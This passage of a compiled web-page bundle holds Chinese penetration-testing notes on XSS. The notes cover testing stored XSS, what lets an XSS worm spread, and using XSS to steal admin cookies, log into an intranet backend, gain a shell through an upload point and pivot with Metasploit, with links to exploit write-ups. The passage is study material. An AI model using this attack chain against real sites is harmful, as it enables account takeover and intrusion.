"),a("p",[s._v("对于存储型"),a("code",[s._v("XSS")]),s._v("：正常的输入payload查看是否过滤，也可以反向猜测输出点，构造payload去输入")]),s._v(" "),a("p",[a("strong",[s._v("XSS 蠕虫的产生条件 ？")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("可以执行恶意操作；")])]),s._v(" "),a("li",[a("p",[s._v("可以感染并传播")]),s._v(" "),a("blockquote",[a("p",[s._v("就是产生"),a("code",[s._v("XSS")]),s._v("点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生 （微博、贴吧）")]),s._v(" "),a("p",[s._v("由于"),a("code",[s._v("XSS")]),s._v("蠕虫基于浏览器而不是操作系统，取决于其依赖网站的规模，它可以在短时间内达到对巨大数量的计算机感染")])])])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://www.cnblogs.com/milantgh/p/3655070.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("一个大佬的博客各种XSS蠕虫源码分析"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("strong",[a("code",[s._v("XSS")]),s._v("，能打到后台，但是后台系统处于内网，怎么做内网探测？")])]),s._v(" "),a("p",[a("code",[s._v("XSS")]),s._v("平台拿cookie登录后台，或钓鱼拿登录，然后找上传点"),a("code",[s._v("getshell")]),s._v("，然后结合msf使用")]),s._v(" "),a("p",[s._v("两个实例参考：")]),s._v(" "),a("p",[s._v("https://bbs.ichunqiu.com/thread-46068-1-1.html?from=bkyl")]),s._v(" "),a("p",[s._v("https://shuimugan.com/bug/view?bug_no=76685（这是乌云漏洞库镜像）")]),s._v(" "),a("blockquote",[a("p",[s._v("github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell")])]),s._v(" "),a("p",[a("strong",[s._v("XSS+CSRF组合拳")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://damit5.com/2018/06/02/%E4%B8%80%E6%AC%A1XSS%E5%92%8CCSRF%E7%9A%84%E7%BB%84%E5%90%88%E6%8B%B3%E8%BF%9B%E6%94%BB-(CSRF+JSON)/",target:"_blank",rel:"noopener noreferrer"}},[s._v("一次XSS和CSRF的组合拳进攻 (CSRF+JSON)"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("a",{attrs:{href:"https://forum.90sec.com/t/topic/211",target:"_blank",rel:"noopener noreferrer"}},[s._v("各种漏洞组合拳打出不一样的姿势"),a("OutboundLink")],1)])])}),[],!1,null,null,null);t.default=n.exports}}]);